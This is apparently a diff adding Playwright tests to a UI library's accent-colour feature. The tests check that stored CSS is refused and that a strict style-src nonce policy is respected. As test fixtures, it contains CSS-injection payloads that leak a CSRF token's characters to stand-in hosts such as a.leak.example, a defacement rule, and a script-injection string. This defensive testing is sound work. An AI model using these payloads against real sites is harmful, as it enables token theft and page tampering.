@@ -244,6 +244,57 @@ test.describe('on the accent page', () => {
 		expect(await page.evaluate(() => document.querySelectorAll('style#kern-accent').length)).toBe(1);
 	});
 
+	test('the head script refuses the exfiltration and defacement payloads in the storage', async ({ page }) => {
+		await open(page, 'accent');
+		const payloads = [
+			`input[name=csrf][value^='a']{background-image:image-set("http:a.leak.example" 1x)}`,
+			`:root:has(input[value^='x']) body{cursor:-webkit-image-set("http:x.leak.example" 1x),auto}`,
+			'body::before{content:"Session abgelaufen"}*{display:none}'
+		];
+		for (const payload of payloads) {
+			await page.evaluate((css) => localStorage.setItem('k-accent', css), payload);
+			await page.route('**/tests/elements/pages/accent.html', async (route) => {
+				const response = await route.fetch();
+				await route.fulfill({
+					response,
+					body: (await response.text()).replace('<head>', `<head><script>${createAccentScript('k-accent')}</script>`)
+				});
+			});
+			await page.goto('/tests/elements/pages/accent.html');
+			expect(await page.evaluate(() => document.getElementById('kern-accent'))).toBeNull();
+			expect(await page.evaluate(() => getComputedStyle(document.body).display)).not.toBe('none');
+			await page.unroute('**/tests/elements/pages/accent.html');
+		}
+	});
+
+	test('under a strict style-src, installAccent needs the nonce and applyAccent works without one', async ({ page }) => {
+		await page.route('**/tests/elements/pages/accent.html', async (route) => {
+			const response = await route.fetch();
+			await route.fulfill({
+				response,
+				headers: {
+					...response.headers(),
+					'content-security-policy': "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'nonce-abc123'"
+				}
+			});
+		});
+		await page.goto('/tests/elements/pages/accent.html');
+		await page.waitForFunction(() => !!window.kern?.accent);
+		const accent = (): Promise<string> =>
+			page.evaluate(() => getComputedStyle(document.documentElement).getPropertyValue('--k-accent').trim());
+		await page.evaluate(() => window.kern?.accent.install('#e91e8c'));
+		expect(await accent()).toBe('#d77b6f');
+		await page.evaluate(() => window.kern?.accent.install('#e91e8c', { nonce: 'abc123' }));
+		expect(await accent()).toBe('#e91e8c');
+		await page.evaluate(() => window.kern?.accent.remove());
+		const inline = await page.evaluate(() => {
+			const el = document.getElementById('scope');
+			const r = el && window.kern?.accent.apply(el, '#e91e8c');
+			return [r && r.ok, el && getComputedStyle(el).getPropertyValue('--k-primary').trim() !== ''];
+		});
+		expect(inline).toEqual([true, true]);
+	});
+
 	test('the head script ignores foreign content in the storage', async ({ page }) => {
 		await open(page, 'accent');
 		await page.evaluate(() => localStorage.setItem('k-accent', '</style><script>window.pwned = 1</script>'));
